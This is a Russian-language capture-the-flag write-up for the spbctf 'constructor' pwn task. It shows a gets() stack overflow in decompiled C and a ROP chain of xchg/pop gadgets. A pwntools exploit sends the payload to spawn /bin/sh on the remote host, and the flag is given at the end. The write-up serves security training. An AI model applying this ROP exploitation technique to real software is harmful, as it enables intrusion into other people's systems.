[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn3_constructor)
Описание:
В дестве все мы любили конструкторы...
`nc 109.233.56.90 11634`
**[constructor.elf](https://pwn.spbctf.ru/files/aslr/constructor/constructor.elf)**

Имеется уязвимость переполнения буфера, необходимо составить ROP-цепочку.
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[8]; // [rsp+8h] [rbp-8h] BYREF

  gets(v4, argv, envp);
  return 0;
}
```

Имеющиеся гаджеты:
1. `xchg    rdx, rdi`
2. `xchg    rdx, rsi`
3. `pop     rdx`
4. `mov     rax, 59`
5. `syscall`

Для получения шела необходимо выполнить `syscall`, `rdi = bin/sh` addr, `rsi = 0`, `rdx = 0`, `rax = 59`.
Код:
``` nasm
pop rax (59)
pop rdx (0)
xchg rdx, rsi
pop rdx (bin_sh)
xchg rdx, rdi
pop rdx (0)
syscall
```

Эксплоит:
``` python
pop_rax59 = 0x40115B
pop_rdx = 0x401156
xchg_rdi = 0x401148
xchg_rsi = 0x40114F
syscall = 0x401142
bin_sh = 0x402004

io = start()

payload = b'A' * 16
payload += p64(pop_rax59)               # pop rax (59)
payload += p64(pop_rdx) + b'\x00' * 8   # pop rdx (0)
payload += p64(xchg_rsi)                # xchg rdx, rsi
payload += p64(pop_rdx) + p64(bin_sh)   # pop rdx (bin_sh)
payload += p64(xchg_rdi)                # xchg rdx, rdi
payload += p64(pop_rdx) + b'\x00' * 8   # pop rdx (0)
payload += p64(syscall)                 # syscall

io.sendline(payload)

io.interactive()
```

Запуск:
![{68A1522B-5728-4EF9-94E2-B79C7A334E60}](../../../../z.%20Images/{68A1522B-5728-4EF9-94E2-B79C7A334E60}.png)

Ответ: `spbctf{30a74f820c78437288434ae9a10d7926}`